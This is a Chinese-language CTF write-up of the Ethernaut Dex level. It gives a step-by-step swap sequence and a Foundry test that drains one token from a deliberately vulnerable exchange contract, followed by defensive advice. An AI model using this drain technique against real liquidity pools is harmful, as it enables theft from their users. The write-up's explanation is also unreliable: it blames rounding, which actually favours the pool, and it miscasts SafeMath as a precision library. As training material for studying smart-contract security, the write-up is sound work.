---
title: 'Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞'
date: 2025-01-25 16:55:00
updated: 2025-01-25 16:55:00
categories:
  - Ethernaut 系列
  - 高级攻击篇 (21-25)
tags:
  - Ethernaut
  - Foundry
  - DEX
  - Price Manipulation
  - Integer Division
  - 智能合约安全
series: Ethernaut Foundry Solutions
excerpt: "利用一个简易DEX中由于整数除法舍入误差导致的价格计算漏洞，通过多次小额交易来耗尽池中其中一种代币的流动性。学习如何通过反复交换来放大舍入误差，最终实现对价格的完全操纵。"
---

# 🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞

> **关卡链接**: [Ethernaut Level 22 - Dex](https://ethernaut.openzeppelin.com/level/22)  
> **攻击类型**: 价格操纵 / 整数舍入漏洞  
> **难度**: ⭐⭐⭐☆☆

## 📋 挑战目标

你和 `Dex` 合约最初都拥有 `Token1` 和 `Token2`。你的目标是耗尽 `Dex` 合约中 `Token1` 或 `Token2` 的全部流动性。

-   **初始状态**: 
    -   Player: 10 TKN1, 10 TKN2
    -   Dex: 100 TKN1, 100 TKN2

![Dex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg)

## 🔍 漏洞分析

这个 `Dex` 合约是一个极简的去中心化交易所，其核心漏洞在于它的价格计算函数 `getSwapPrice()`：

```solidity
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

这个函数通过两种代币在池中余额的比例来计算交换价格。问题出在 Solidity 的整数除法上。整数除法会向下舍入到最接近的整数，任何小数部分都会被丢弃。例如，`7 / 2` 的结果是 `3`，而不是 `3.5`。

我们可以利用这个舍入误差来获利。通过精心设计的交换顺序，我们可以在每次交换中获得比预期“公平”价格更多的代币，从而逐渐耗尽池中的资金。

### 攻击流程

我们的策略是通过在两种代币之间反复交换我们的全部余额来放大这个舍入误差。

1.  **初始状态**: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). 价格比为 1:1。

2.  **第一次交换 (10 TKN1 -> TKN2)**:
    -   `amountOut = (10 * 100) / 100 = 10`
    -   Player: (0 TKN1, 20 TKN2)
    -   Dex: (110 TKN1, 90 TKN2)

3.  **第二次交换 (20 TKN2 -> TKN1)**:
    -   `amountOut = (20 * 110) / 90 = 24.44...` -> **舍入后为 24**
    -   Player: (24 TKN1, 0 TKN2)
    -   Dex: (86 TKN1, 110 TKN2)

4.  **第三次交换 (24 TKN1 -> TKN2)**:
    -   `amountOut = (24 * 110) / 86 = 30.69...` -> **舍入后为 30**
    -   Player: (0 TKN1, 30 TKN2)
    -   Dex: (110 TKN1, 80 TKN2)

5.  **第四次交换 (30 TKN2 -> TKN1)**:
    -   `amountOut = (30 * 110) / 80 = 41.25` -> **舍入后为 41**
    -   Player: (41 TKN1, 0 TKN2)
    -   Dex: (69 TKN1, 110 TKN2)

6.  **第五次交换 (41 TKN1 -> TKN2)**:
    -   `amountOut = (41 * 110) / 69 = 65.36...` -> **舍入后为 65**
    -   Player: (0 TKN1, 65 TKN2)
    -   Dex: (110 TKN1, 45 TKN2)

现在，我们手上有65个TKN2，而Dex池中只剩下110个TKN1和45个TKN2。我们只需要用45个TKN2就可以换走池里所有的110个TKN1。

7.  **最终交换 (45 TKN2 -> TKN1)**:
    -   `amountOut = (45 * 110) / 45 = 110`
    -   Player: (110 TKN1, 20 TKN2)
    -   Dex: (0 TKN1, 90 TKN2) -> **TKN1 被耗尽！**

通过这种方式，我们利用了整数除法的舍入误差，在每次交易中都获得了微小的优势，并最终将这种优势累积到足以清空整个池子。

## 💻 Foundry 实现

### Foundry 测试代码

测试代码将模拟上述的交换流程。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/22_Dex.sol";

contract DexTest is Test {
    Dex instance;
    address player;
    SwappableToken token1;
    SwappableToken token2;

    function setUp() public {
        player = vm.addr(1);
        instance = new Dex();

        // 部署并设置代币
        token1 = new SwappableToken(address(instance), "Token 1", "TKN1", 110);
        token2 = new SwappableToken(address(instance), "Token 2", "TKN2", 110);
        instance.setTokens(address(token1), address(token2));

        // 添加流动性
        token1.approve(address(instance), 100);
        token2.approve(address(instance), 100);
        instance.addLiquidity(address(token1), 100);
        instance.addLiquidity(address(token2), 100);

        // 发送初始代币给 player
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    function testDexAttack() public {
        vm.startPrank(player);

        // 授权 Dex 合约无限量的代币
        token1.approve(address(instance), type(uint256).max);
        token2.approve(address(instance), type(uint256).max);

        // 执行攻击流程
        swapAll(address(token1), address(token2)); // 10 TKN1 -> 10 TKN2
        swapAll(address(token2), address(token1)); // 20 TKN2 -> 24 TKN1
        swapAll(address(token1), address(token2)); // 24 TKN1 -> 30 TKN2
        swapAll(address(token2), address(token1)); // 30 TKN2 -> 41 TKN1
        swapAll(address(token1), address(token2)); // 41 TKN1 -> 65 TKN2
        
        // 最终一击
        instance.swap(address(token2), address(token1), 45);

        // 验证 Dex 中至少一种代币已被耗尽
        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;
        assertTrue(drained, "Dex should be drained of one token");

        vm.stopPrank();
    }

    // 辅助函数，用于交换指定代币的全部余额
    function swapAll(address tokenIn, address tokenOut) internal {
        uint256 balance = IERC20(tokenIn).balanceOf(player);
        instance.swap(tokenIn, tokenOut, balance);
    }
}
```

### 关键攻击步骤

1.  **授权**: 授权 `Dex` 合约可以从你的地址转移 `Token1` 和 `Token2`。
2.  **反复交换**: 在 `Token1` 和 `Token2` 之间来回交换你的全部余额。
3.  **利用误差**: 每次交换都会因为整数除法的舍入而产生微小的利润。
4.  **累积优势**: 重复交换，直到你拥有的代币数量足以一次性换走池中剩余的所有另一种代币。
5.  **最终一击**: 执行最后一次交换，清空池子。

## 🛡️ 防御措施

1.  **避免价格操纵**: 简单的 `balanceOf(A) / balanceOf(B)` 价格公式极易受到操纵。现代DEX（如Uniswap V2）使用 `x * y = k` 的恒定乘积公式，这使得操纵价格的成本要高得多。
2.  **处理舍入误差**: 在金融计算中，必须仔细处理精度问题。可以考虑：
    *   将计算顺序调整为先乘后除，以减少精度损失。
    *   使用更高精度的数学库，如 `SafeMath` 或专门的定点数库。
3.  **使用去中心化预言机**: 对于需要可靠价格的应用，不应依赖于单个DEX池的瞬时价格。应使用更稳健的价格来源，如 Chainlink 或 Uniswap V3 的时间加权平均价格（TWAP）预言机。

## 🔧 相关工具和技术

-   **DEX (去中心化交易所)**: 一种基于智能合约的交易所，允许用户在没有中心化中介的情况下交易加密资产。
-   **价格预言机 (Price Oracle)**: 为智能合约提供链下或链上资产价格信息的服务。
-   **整数除法**: Solidity（以及许多其他编程语言）中整数除法向下舍入的特性，是许多数学相关漏洞的根源。

## 🎯 总结

**核心概念**:
-   在智能合约中进行金融计算时，整数除法的舍入误差可能导致严重的漏洞。
-   简单的、基于即时流动性的价格发现机制很容易被操纵。

**攻击向量**:
-   通过一系列精心设计的交易，利用并放大整数除法的舍入误差。
-   逐渐积累优势，直到能够完全耗尽流动性池。

**防御策略**:
-   使用更成熟和抗操纵的定价模型（如恒定乘积模型）。
-   在进行数学运算时，始终注意运算顺序和精度损失问题。
-   对于关键应用，依赖于健壮的价格预言机，而不是易受攻击的即时价格。

## 📚 参考资料

-   [Uniswap V2 Whitepaper](https://uniswap.org/whitepaper.pdf)
-   [Chainlink Price Feeds](https://docs.chain.link/docs/get-the-latest-price/)